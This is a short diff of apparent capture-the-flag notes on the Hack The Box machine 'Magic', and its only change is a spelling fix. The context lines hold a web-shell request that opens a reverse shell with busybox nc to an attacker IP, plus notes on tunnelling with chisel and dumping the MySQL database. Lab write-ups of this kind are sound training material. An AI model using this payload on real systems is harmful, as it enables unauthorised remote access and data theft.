@@ -14,7 +14,7 @@ A lot of binaries with SUID were set and we actually missed it the first time bu
 image files at images/uploads/[file]
 http://magic.htb/images/uploads/black.php.jpeg?cmd=busybox%20nc%2010.10.14.15%209001%20-e%20%2Fbin%2Fsh
 
-how to interact with sql without the clinet [chisel]
+how to interact with sql without the client [chisel]
 
 full pty shell needed otherwise how find mysqldump
 mysqldump -u theseus -p Magic
